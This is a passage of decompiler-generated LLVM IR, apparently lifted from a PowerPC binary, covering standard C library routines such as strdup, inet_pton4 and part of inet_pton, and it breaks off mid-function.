
dec_label_pc_10013b7c:                            ; preds = %dec_label_pc_10013b74
  %v1_10013b7c = add i32 %v0_10013b7c, 1
  %v1_10013b80 = add i32 %v0_10013b80, 1
  %v1_10013b84 = inttoptr i32 %v1_10013b80 to i8*
  %v2_10013b84 = load i8, i8* %v1_10013b84, align 1
  %v3_10013b88 = icmp eq i8 %v2_10013b84, 0
  br i1 %v3_10013b88, label %dec_label_pc_10013b98, label %dec_label_pc_10013b90

dec_label_pc_10013b90:                            ; preds = %entry, %dec_label_pc_10013b7c
  %v0_10013b80 = phi i32 [ %v1_10013b80, %dec_label_pc_10013b7c ], [ %v0_10013b841, %entry ]
  %v0_10013b7c = phi i32 [ %v1_10013b7c, %dec_label_pc_10013b7c ], [ 0, %entry ]
  %v0_10013b6c8.in = phi i8 [ %v2_10013b84, %dec_label_pc_10013b7c ], [ %v2_10013b843, %entry ]
  br label %dec_label_pc_10013b60

dec_label_pc_10013b98:                            ; preds = %dec_label_pc_10013b7c, %dec_label_pc_10013b74, %entry
  %v0_10013b98 = phi i32 [ 0, %entry ], [ %v1_10013b7c, %dec_label_pc_10013b7c ], [ %v0_10013b7c, %dec_label_pc_10013b74 ]
  ret i32 %v0_10013b98

; uselistorder directives
  uselistorder i32 %v0_10013b60, { 1, 0 }
  uselistorder label %dec_label_pc_10013b90, { 1, 0 }
  uselistorder label %dec_label_pc_10013b60, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_10013bb4 = call i32 @__GI_strlen()
  %v1_10013bb8 = add i32 %v0_10013bb4, 1
  store i32 %v1_10013bb8, i32* @r29, align 4
  store i32 %v1_10013bb8, i32* @r3, align 4
  store i32 268516292, i32* @lr, align 4
  %v0_10013bc0 = call i32 @malloc()
  store i32 %v0_10013bc0, i32* @r3, align 4
  %v0_10013bc4 = load i32, i32* @r28, align 4
  store i32 %v0_10013bc4, i32* @r4, align 4
  store i32 %v0_10013bc0, i32* @r31, align 4
  %v3_10013bc8 = icmp eq i32 %v0_10013bc0, 0
  %v0_10013bcc = load i32, i32* @r29, align 4
  store i32 %v0_10013bcc, i32* @r5, align 4
  br i1 %v3_10013bc8, label %dec_label_pc_10013bd8, label %dec_label_pc_10013bd4

dec_label_pc_10013bd4:                            ; preds = %entry
  store i32 268516312, i32* @lr, align 4
  %v0_10013bd4 = call i32 @memcpy()
  %v0_10013bdc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013bd8

dec_label_pc_10013bd8:                            ; preds = %entry, %dec_label_pc_10013bd4
  %v0_10013bdc = phi i32 [ 0, %entry ], [ %v0_10013bdc.pre, %dec_label_pc_10013bd4 ]
  ret i32 %v0_10013bdc

; uselistorder directives
  uselistorder i32 ()* @malloc, { 9, 6, 5, 15, 14, 8, 7, 13, 12, 3, 11, 10, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_10013bd8, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10013bf0 = load i32, i32* @lr, align 4
  store i32 %v0_10013bf0, i32* %r0.global-to-local, align 4
  %v0_10013bf8 = call i32 @__asm_mfcr()
  store i32 %v0_10013bf8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_10013c04 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10013c04, i32* %r7.global-to-local, align 4
  %v0_10013c08 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10013c70

dec_label_pc_10013c20:                            ; preds = %dec_label_pc_10013c70
  %v3_10013c20 = icmp eq i32 %v0_10013c94, 4
  store i1 %v3_10013c20, i1* %cr7_eq.global-to-local, align 1
  %v0_10013c24 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10013c24, label %dec_label_pc_10013c5c, label %dec_label_pc_10013c28

dec_label_pc_10013c28:                            ; preds = %dec_label_pc_10013c20
  %v0_10013c28 = load i32, i32* %r7.global-to-local, align 4
  %v1_10013c28 = inttoptr i32 %v0_10013c28 to i8*
  %v2_10013c28 = load i8, i8* %v1_10013c28, align 1
  %v3_10013c28 = zext i8 %v2_10013c28 to i32
  %v1_10013c2c = mul nuw nsw i32 %v3_10013c28, 10
  %v1_10013c30 = load i32, i32* %r11.global-to-local, align 4
  %v2_10013c30 = add i32 %v1_10013c2c, %v1_10013c30
  %v1_10013c34 = add i32 %v2_10013c30, -48
  store i32 %v1_10013c34, i32* %r0.global-to-local, align 4
  %v2_10013c38 = icmp ugt i32 %v1_10013c34, 255
  %v3_10013c38 = icmp eq i32 %v1_10013c34, 255
  store i1 %v3_10013c38, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10013c38, label %dec_label_pc_10013cb8, label %dec_label_pc_10013c40

dec_label_pc_10013c40:                            ; preds = %dec_label_pc_10013c28
  %v1_10013c40 = trunc i32 %v1_10013c34 to i8
  store i8 %v1_10013c40, i8* %v1_10013c28, align 1
  %v0_10013c44 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10013c44, label %dec_label_pc_10013c48, label %dec_label_pc_10013c70.backedge

dec_label_pc_10013c48:                            ; preds = %dec_label_pc_10013c40
  %v0_10013c48 = load i32, i32* %r10.global-to-local, align 4
  %v1_10013c48 = add i32 %v0_10013c48, 1
  store i32 %v1_10013c48, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_10013c50 = icmp sgt i32 %v1_10013c48, 4
  %v3_10013c50 = icmp eq i32 %v1_10013c48, 4
  store i1 %v3_10013c50, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10013c50, label %dec_label_pc_10013cb8, label %dec_label_pc_10013c70.backedge

dec_label_pc_10013c5c:                            ; preds = %dec_label_pc_10013c20
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_10013c60 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_10013c60.not = xor i1 %v0_10013c60, true
  %v0_10013c64 = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10013c20, %v0_10013c64
  %or.cond = or i1 %brmerge, %v0_10013c60.not
  br i1 %or.cond, label %dec_label_pc_10013cb8, label %dec_label_pc_10013c6c

dec_label_pc_10013c6c:                            ; preds = %dec_label_pc_10013c5c
  %v0_10013c6c = load i32, i32* %r6.global-to-local, align 4
  %v1_10013c6c = trunc i32 %v0_10013c6c to i8
  %v2_10013c6c = load i32, i32* %r7.global-to-local, align 4
  %v3_10013c6c = add i32 %v2_10013c6c, 1
  %v4_10013c6c = inttoptr i32 %v3_10013c6c to i8*
  store i8 %v1_10013c6c, i8* %v4_10013c6c, align 1
  store i32 %v3_10013c6c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10013c70.backedge

dec_label_pc_10013c70.backedge:                   ; preds = %dec_label_pc_10013c6c, %dec_label_pc_10013c40, %dec_label_pc_10013c48
  %v0_10013c70.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10013c74.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10013c70

dec_label_pc_10013c70:                            ; preds = %dec_label_pc_10013c70.backedge, %entry
  %v0_10013c74 = phi i32 [ %v0_10013c74.pre, %dec_label_pc_10013c70.backedge ], [ 0, %entry ]
  %v0_10013c78 = phi i32 [ %v0_10013c70.pre, %dec_label_pc_10013c70.backedge ], [ %v0_10013bf8, %entry ]
  %v1_10013c70 = inttoptr i32 %v0_10013c78 to i8*
  %v2_10013c70 = load i8, i8* %v1_10013c70, align 1
  %v3_10013c70 = zext i8 %v2_10013c70 to i32
  store i32 %v3_10013c70, i32* %r11.global-to-local, align 4
  %v3_10013c74 = icmp eq i32 %v0_10013c74, 0
  store i1 %v3_10013c74, i1* %cr4_eq.global-to-local, align 1
  %v1_10013c78 = add i32 %v0_10013c78, 1
  store i32 %v1_10013c78, i32* %r3.global-to-local, align 4
  %v3_10013c7c = icmp eq i8 %v2_10013c70, 0
  store i1 %v3_10013c7c, i1* %cr7_eq.global-to-local, align 1
  %v1_10013c80 = add nsw i32 %v3_10013c70, -48
  store i32 %v1_10013c80, i32* %r0.global-to-local, align 4
  %v2_10013c84 = icmp ugt i32 %v1_10013c80, 9
  store i1 %v2_10013c84, i1* %cr6_gt.global-to-local, align 1
  %v3_10013c88 = icmp eq i8 %v2_10013c70, 46
  store i1 %v3_10013c88, i1* %cr1_eq.global-to-local, align 1
  %v0_10013c8c = load i4, i4* @cr4, align 1
  %v1_10013c8c = call %2 @__asm_mcrf_cr0_write(i4 %v0_10013c8c)
  %v4_10013c8c = extractvalue %2 %v1_10013c8c, 2
  store i1 %v4_10013c8c, i1* %cr0_eq.global-to-local, align 1
  %v0_10013c90 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_10013c94 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_10013c90, label %dec_label_pc_10013c94, label %dec_label_pc_10013c20

dec_label_pc_10013c94:                            ; preds = %dec_label_pc_10013c70
  %v3_10013c94 = icmp eq i32 %v0_10013c94, 3
  store i1 %v3_10013c94, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_10013c94, 4
  br i1 %tmp9, label %dec_label_pc_10013cb8, label %dec_label_pc_10013c9c

dec_label_pc_10013c9c:                            ; preds = %dec_label_pc_10013c94
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_10013c04, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10013cac.731 to i32), i32* @lr, align 4
  %v0_10013ca8 = call i32 @memcpy()
  br label %dec_label_pc_10013cb8

dec_label_pc_10013cb8:                            ; preds = %dec_label_pc_10013c5c, %dec_label_pc_10013c28, %dec_label_pc_10013c48, %dec_label_pc_10013c94, %dec_label_pc_10013c9c
  %storemerge = phi i32 [ 1, %dec_label_pc_10013c9c ], [ 0, %dec_label_pc_10013c94 ], [ 0, %dec_label_pc_10013c48 ], [ 0, %dec_label_pc_10013c28 ], [ 0, %dec_label_pc_10013c5c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_10013c08, i32* %r0.global-to-local, align 4
  %v1_10013cc8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10013bf8)
  %v4_10013cc8 = extractvalue %0 %v1_10013cc8, 2
  store i1 %v4_10013cc8, i1* %cr0_eq.global-to-local, align 1
  %v9_10013cc8 = extractvalue %0 %v1_10013cc8, 7
  store i4 %v9_10013cc8, i4* @cr4, align 1
  %v0_10013ccc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013ccc

; uselistorder directives
  uselistorder i32 %v1_10013c48, { 1, 0, 2 }
  uselistorder i32 %v1_10013c34, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10013bf8, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 5, 6, 7, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10013cb8, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10013c70.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_10013cd0 = icmp eq i32 %arg1, 2
  %v0_10013cd4 = load i32, i32* @lr, align 4
  store i32 %v0_10013cd4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_10013cd0, label %dec_label_pc_10013cfc, label %dec_label_pc_10013cf0

dec_label_pc_10013cf0:                            ; preds = %entry
  %v3_10013cf0 = icmp eq i32 %arg1, 10
  br i1 %v3_10013cf0, label %dec_label_pc_10013d10, label %dec_label_pc_10013eac

dec_label_pc_10013cfc:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268516616, i32* @lr, align 4
  %v3_10013d04 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_10013d04, i32* %r3.global-to-local, align 4
  store i32 %v3_10013d04, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013ec4

dec_label_pc_10013d10:                            ; preds = %dec_label_pc_10013cf0
  %v2_10013d10 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10013d10, i32* %r3.global-to-local, align 4
  store i32 268516640, i32* @lr, align 4
  %v3_10013d1c = call i32 @__GI_memset(i32 %v2_10013d10, i32 0, i32 16)
  store i32 %v3_10013d1c, i32* %r3.global-to-local, align 4
  %v0_10013d20 = load i32, i32* @r29, align 4
  %v1_10013d20 = inttoptr i32 %v0_10013d20 to i8*
  %v2_10013d20 = load i8, i8* %v1_10013d20, align 1
  %v3_10013d20 = zext i8 %v2_10013d20 to i32
  store i32 %v3_10013d20, i32* %r0.global-to-local, align 4
  store i32 %v3_10013d1c, i32* @r31, align 4
  %v2_10013d28 = add i32 %v3_10013d1c, 16
  store i32 %v2_10013d28, i32* @r27, align 4
  %v3_10013d2c = icmp eq i8 %v2_10013d20, 58
  br i1 %v3_10013d2c, label %dec_label_pc_10013d34, label %dec_label_pc_10013d40

dec_label_pc_10013d34:                            ; preds = %dec_label_pc_10013d10
  %v1_10013d34 = add i32 %v0_10013d20, 1
  %v2_10013d34 = inttoptr i32 %v1_10013d34 to i8*
  %v3_10013d34 = load i8, i8* %v2_10013d34, align 1
  %v4_10013d34 = zext i8 %v3_10013d34 to i32
  store i32 %v4_10013d34, i32* %r0.global-to-local, align 4
  store i32 %v1_10013d34, i32* @r29, align 4
  %v3_10013d38 = icmp eq i8 %v3_10013d34, 58
  br i1 %v3_10013d38, label %dec_label_pc_10013d40, label %dec_label_pc_10013ec0

dec_label_pc_10013d40:                            ; preds = %dec_label_pc_10013d34, %dec_label_pc_10013d10
  %v0_10013d40 = phi i32 [ %v1_10013d34, %dec_label_pc_10013d34 ], [ %v0_10013d20, %dec_label_pc_10013d10 ]
  store i32 %v0_10013d40, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_10013e143036 = inttoptr i32 %v0_10013d40 to i8*
  %v2_10013e143137 = load i8, i8* %v1_10013e143036, align 1
  %v3_10013e143238 = zext i8 %v2_10013e143137 to i32
  store i32 %v3_10013e143238, i32* %r3.global-to-local, align 4
  store i32 268516892, i32* @lr, align 4
  %v1_10013e183339 = call i32 @__GI_tolower(i32 %v3_10013e143238)
  store i32 %v1_10013e183339, i32* %r3.global-to-local, align 4
  store i32 %v1_10013e183339, i32* @r30, align 4
  %v3_10013e1c3440 = icmp eq i32 %v1_10013e183339, 0
  br i1 %v3_10013e1c3440, label %dec_label_pc_10013e24, label %dec_label_pc_10013d4c.lr.ph

dec_label_pc_10013d4c:                            ; preds = %dec_label_pc_10013d4c.lr.ph, %dec_label_pc_10013e14.backedge
  %v1_10013e1835 = phi i32 [ %v1_10013e183341, %dec_label_pc_10013d4c.lr.ph ], [ %v1_10013e18, %dec_label_pc_10013e14.backedge ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_100181f0.732 to i32), i32* @r25, align 4
  %v0_10013d58 = load i32, i32* @r29, align 4
  %v1_10013d58 = add i32 %v0_10013d58, 1
  store i32 %v1_10013d58, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_100181f0.732 to i32), i32* @r3, align 4
  store i32 268516708, i32* @lr, align 4
  %v3_10013d60 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_100181f0.732 to i32), i32 %v1_10013e1835)
  store i32 %v3_10013d60, i32* %r3.global-to-local, align 4
  %v3_10013d64 = icmp eq i32 %v3_10013d60, 0
  br i1 %v3_10013d64, label %dec_label_pc_10013d84, label %dec_label_pc_10013d6c

dec_label_pc_10013d6c:                            ; preds = %dec_label_pc_10013d4c
  %v0_10013d6c = load i32, i32* @r25, align 4
  %v2_10013d6c = sub i32 %v3_10013d60, %v0_10013d6c
  store i32 %v2_10013d6c, i32* %r0.global-to-local, align 4
  %v0_10013d70 = load i32, i32* @r28, align 4
  %v1_10013d70 = mul i32 %v0_10013d70, 16
  store i32 %v1_10013d70, i32* %r9.global-to-local, align 4
  %v2_10013d74 = or i32 %v1_10013d70, %v2_10013d6c
  store i32 %v2_10013d74, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_10013d74, 65536
  br i1 %tmp19, label %dec_label_pc_10013e10, label %dec_label_pc_10013ec0

dec_label_pc_10013d84:                            ; preds = %dec_label_pc_10013d4c
  %v0_10013d84 = load i32, i32* @r30, align 4
  %v3_10013d84 = icmp eq i32 %v0_10013d84, 58
  br i1 %v3_10013d84, label %dec_label_pc_10013d8c, label %dec_label_pc_10013de0

dec_label_pc_10013d8c:                            ; preds = %dec_label_pc_10013d84
  %v0_10013d8c = load i32, i32* @r23, align 4
  %v3_10013d8c = icmp eq i32 %v0_10013d8c, 0
  br i1 %v3_10013d8c, label %dec_label_pc_10013d94, label %dec_label_pc_10013da8

dec_label_pc_10013d94:                            ; preds = %dec_label_pc_10013d8c
  %v0_10013d94 = load i32, i32* @r24, align 4
  %v3_10013d94 = icmp eq i32 %v0_10013d94, 0
  br i1 %v3_10013d94, label %dec_label_pc_10013d9c, label %dec_label_pc_10013ec0

dec_label_pc_10013d9c:                            ; preds = %dec_label_pc_10013d94
  %v0_10013d9c = load i32, i32* @r31, align 4
  store i32 %v0_10013d9c, i32* @r24, align 4
  %v0_10013da0 = load i32, i32* @r29, align 4
  store i32 %v0_10013da0, i32* @r26, align 4
  br label %dec_label_pc_10013e14.backedge

dec_label_pc_10013da8:                            ; preds = %dec_label_pc_10013d8c
  %v0_10013da8 = load i32, i32* @r29, align 4
  %v1_10013da8 = inttoptr i32 %v0_10013da8 to i8*
  %v2_10013da8 = load i8, i8* %v1_10013da8, align 1
  %v3_10013da8 = zext i8 %v2_10013da8 to i32
  store i32 %v3_10013da8, i32* %r0.global-to-local, align 4
  %v3_10013dac = icmp eq i8 %v2_10013da8, 0
  br i1 %v3_10013dac, label %dec_label_pc_10013ec0, label %dec_label_pc_10013db4

dec_label_pc_10013db4:                            ; preds = %dec_label_pc_10013da8
  %v0_10013db4 = load i32, i32* @r31, align 4
  %v1_10013db4 = add i32 %v0_10013db4, 2
  store i32 %v1_10013db4, i32* %r0.global-to-local, align 4
  %v1_10013db8 = load i32, i32* @r27, align 4
  %v3_10013db8 = icmp ugt i32 %v1_10013db4, %v1_10013db8
  br i1 %v3_10013db8, label %dec_label_pc_10013ec0, label %dec_label_pc_10013dc0

dec_label_pc_10013dc0:                            ; preds = %dec_label_pc_10013db4
  %v0_10013dc0 = load i32, i32* @r28, align 4
  %v1_10013dc0 = udiv i32 %v0_10013dc0, 256
  store i32 %v1_10013dc0, i32* %r0.global-to-local, align 4
  %v1_10013dc4 = trunc i32 %v0_10013dc0 to i8
  %v3_10013dc4 = add i32 %v0_10013db4, 1
  %v4_10013dc4 = inttoptr i32 %v3_10013dc4 to i8*
  store i8 %v1_10013dc4, i8* %v4_10013dc4, align 1
  %v0_10013dc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013dc8 = trunc i32 %v0_10013dc8 to i8
  %v2_10013dc8 = load i32, i32* @r31, align 4
  %v3_10013dc8 = inttoptr i32 %v2_10013dc8 to i8*
  store i8 %v1_10013dc8, i8* %v3_10013dc8, align 1
  %v0_10013dcc = load i32, i32* @r29, align 4
  store i32 %v0_10013dcc, i32* @r26, align 4
  %v0_10013dd0 = load i32, i32* @r31, align 4
  %v1_10013dd0 = add i32 %v0_10013dd0, 2
  store i32 %v1_10013dd0, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_10013e1430 = inttoptr i32 %v0_10013dcc to i8*
  %v2_10013e1431 = load i8, i8* %v1_10013e1430, align 1
  %v3_10013e1432 = zext i8 %v2_10013e1431 to i32
  store i32 %v3_10013e1432, i32* %r3.global-to-local, align 4
  store i32 268516892, i32* @lr, align 4
  %v1_10013e1833 = call i32 @__GI_tolower(i32 %v3_10013e1432)
  store i32 %v1_10013e1833, i32* %r3.global-to-local, align 4
  store i32 %v1_10013e1833, i32* @r30, align 4
  %v3_10013e1c34 = icmp eq i32 %v1_10013e1833, 0
  br i1 %v3_10013e1c34, label %dec_label_pc_10013e24, label %dec_label_pc_10013d4c.lr.ph

dec_label_pc_10013d4c.lr.ph:                      ; preds = %dec_label_pc_10013d40, %dec_label_pc_10013dc0
  %v1_10013e183341 = phi i32 [ %v1_10013e1833, %dec_label_pc_10013dc0 ], [ %v1_10013e183339, %dec_label_pc_10013d40 ]
  br label %dec_label_pc_10013d4c

dec_label_pc_10013de0:                            ; preds = %dec_label_pc_10013d84
  %v3_10013de0 = icmp eq i32 %v0_10013d84, 46
  br i1 %v3_10013de0, label %dec_label_pc_10013de8, label %dec_label_pc_10013ec0

dec_label_pc_10013de8:                            ; preds = %dec_label_pc_10013de0
  %v0_10013de8 = load i32, i32* @r31, align 4
  %v1_10013de8 = add i32 %v0_10013de8, 4
  store i32 %v1_10013de8, i32* @r30, align 4
  %v1_10013dec = load i32, i32* @r27, align 4
  %v3_10013dec = icmp ugt i32 %v1_10013de8, %v1_10013dec
  br i1 %v3_10013dec, label %dec_label_pc_10013ec0, label %dec_label_pc_10013df4

dec_label_pc_10013df4:                            ; preds = %dec_label_pc_10013de8
  %v0_10013df8 = load i32, i32* @r26, align 4
  store i32 %v0_10013df8, i32* %r3.global-to-local, align 4
  store i32 268516864, i32* @lr, align 4
  %v3_10013dfc = call i32 @inet_pton4(i32 %v0_10013df8, i32 %v0_10013de8)
  store i32 %v3_10013dfc, i32* %r3.global-to-local, align 4
  %v0_10013e00 = load i32, i32* @r30, align 4
  store i32 %v0_10013e00, i32* @r31, align 4
  %v2_10013e04 = icmp sgt i32 %v3_10013dfc, 0
  br i1 %v2_10013e04, label %dec_label_pc_10013e48, label %dec_label_pc_10013ec0

dec_label_pc_10013e10:                            ; preds = %dec_label_pc_10013d6c
  store i32 1, i32* @r23, align 4
  %v0_10013e14.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10013e14.backedge

dec_label_pc_10013e14.backedge:                   ; preds = %dec_label_pc_10013e10, %dec_label_pc_10013d9c
  %v0_10013e14.be = phi i32 [ %v0_10013e14.pre.pre, %dec_label_pc_10013e10 ], [ %v0_10013da0, %dec_label_pc_10013d9c ]
  %v1_10013e14 = inttoptr i32 %v0_10013e14.be to i8*
  %v2_10013e14 = load i8, i8* %v1_10013e14, align 1
  %v3_10013e14 = zext i8 %v2_10013e14 to i32
  store i32 %v3_10013e14, i32* %r3.global-to-local, align 4
  store i32 268516892, i32* @lr, align 4
  %v1_10013e18 = call i32 @__GI_tolower(i32 %v3_10013e14)
  store i32 %v1_10013e18, i32* %r3.global-to-local, align 4
  store i32 %v1_10013e18, i32* @r30, align 4
  %v3_10013e1c = icmp eq i32 %v1_10013e18, 0
  br i1 %v3_10013e1c, label %dec_label_pc_10013e24, label %dec_label_pc_10013d4c

dec_label_pc_10013e24:                            ; preds = %dec_label_pc_10013e14.backedge, %dec_label_pc_10013d40, %dec_label_pc_10013dc0
  %v0_10013e24 = load i32, i32* @r23, align 4
  %v3_10013e24 = icmp eq i32 %v0_10013e24, 0
  %v0_10013e8c.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_10013e24, label %dec_label_pc_10013e48, label %dec_label_pc_10013e2c

dec_label_pc_10013e2c:                            ; preds = %dec_label_pc_10013e24
  %v1_10013e2c = add i32 %v0_10013e8c.pre.pre, 2
  store i32 %v1_10013e2c, i32* %r0.global-to-local, align 4
  %v1_10013e30 = load i32, i32* @r27, align 4
  %v3_10013e30 = icmp ugt i32 %v1_10013e2c, %v1_10013e30
  br i1 %v3_10013e30, label %dec_label_pc_10013ec0, label %dec_label_pc_10013e38

dec_label_pc_10013e38:                            ; preds = %dec_label_pc_10013e2c
  %v0_10013e38 = load i32, i32* @r28, align 4
  %v1_10013e38 = udiv i32 %v0_10013e38, 256
  store i32 %v1_10013e38, i32* %r0.global-to-local, align 4
  %v1_10013e3c = trunc i32 %v0_10013e38 to i8
  %v3_10013e3c = add i32 %v0_10013e8c.pre.pre, 1
  %v4_10013e3c = inttoptr i32 %v3_10013e3c to i8*
  store i8 %v1_10013e3c, i8* %v4_10013e3c, align 1
  %v0_10013e40 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013e40 = trunc i32 %v0_10013e40 to i8
  %v2_10013e40 = load i32, i32* @r31, align 4
  %v3_10013e40 = inttoptr i32 %v2_10013e40 to i8*
  store i8 %v1_10013e40, i8* %v3_10013e40, align 1
  %v0_10013e44 = load i32, i32* @r31, align 4
  %v1_10013e44 = add i32 %v0_10013e44, 2
  store i32 %v1_10013e44, i32* @r31, align 4
  br label %dec_label_pc_10013e48

dec_label_pc_10013e48:                            ; preds = %dec_label_pc_10013e24, %dec_label_pc_10013df4, %dec_label_pc_10013e38
  %v0_10013e8c.pre = phi i32 [ %v0_10013e00, %dec_label_pc_10013df4 ], [ %v1_10013e44, %dec_label_pc_10013e38 ], [ %v0_10013e8c.pre.pre, %dec_label_pc_10013e24 ]
  %v0_10013e48 = load i32, i32* @r24, align 4
  %v3_10013e48 = icmp eq i32 %v0_10013e48, 0
  %v1_10013e8c.pre = load i32, i32* @r27, align 4
  %v4_10013e8c = icmp eq i32 %v0_10013e8c.pre, %v1_10013e8c.pre
  br i1 %v3_10013e48, label %dec_label_pc_10013e8c, label %dec_label_pc_10013e50

dec_label_pc_10013e50:                            ; preds = %dec_label_pc_10013e48
  %v2_10013e54 = sub i32 %v0_10013e8c.pre, %v0_10013e48
  store i32 %v2_10013e54, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_10013e8c, label %dec_label_pc_10013ec0, label %dec_label_pc_10013e74.preheader

dec_label_pc_10013e74.preheader:                  ; preds = %dec_label_pc_10013e50
  %v3_10013e7424 = icmp slt i32 %v2_10013e54, 1
  %v2_10013e7826 = add i32 %v2_10013e54, -1
  store i32 %v2_10013e7826, i32* %r10.global-to-local, align 4
  %v2_10013e7c27 = add i32 %v1_10013e8c.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_10013e7424, label %dec_label_pc_10013e8c.thread, label %dec_label_pc_10013e68

dec_label_pc_10013e68:                            ; preds = %dec_label_pc_10013e74.preheader, %dec_label_pc_10013e68.dec_label_pc_10013e68_crit_edge
  %v0_10013e68 = phi i32 [ %v0_10013e68.pre, %dec_label_pc_10013e68.dec_label_pc_10013e68_crit_edge ], [ %v0_10013e48, %dec_label_pc_10013e74.preheader ]
  %v2_10013e7c29 = phi i32 [ %v2_10013e7c, %dec_label_pc_10013e68.dec_label_pc_10013e68_crit_edge ], [ %v2_10013e7c27, %dec_label_pc_10013e74.preheader ]
  %v2_10013e7828 = phi i32 [ %v2_10013e78, %dec_label_pc_10013e68.dec_label_pc_10013e68_crit_edge ], [ %v2_10013e7826, %dec_label_pc_10013e74.preheader ]
  %v2_10013e68 = add i32 %v0_10013e68, %v2_10013e7828
  %v3_10013e68 = inttoptr i32 %v2_10013e68 to i8*
  %v4_10013e68 = load i8, i8* %v3_10013e68, align 1
  %v5_10013e68 = zext i8 %v4_10013e68 to i32
  store i32 %v5_10013e68, i32* %r0.global-to-local, align 4
  %v3_10013e6c = inttoptr i32 %v2_10013e7c29 to i8*
  store i8 %v4_10013e68, i8* %v3_10013e6c, align 1
  %v0_10013e70 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013e70 = load i32, i32* @r24, align 4
  %v2_10013e70 = load i32, i32* %r10.global-to-local, align 4
  %v3_10013e70 = trunc i32 %v0_10013e70 to i8
  %v4_10013e70 = add i32 %v2_10013e70, %v1_10013e70
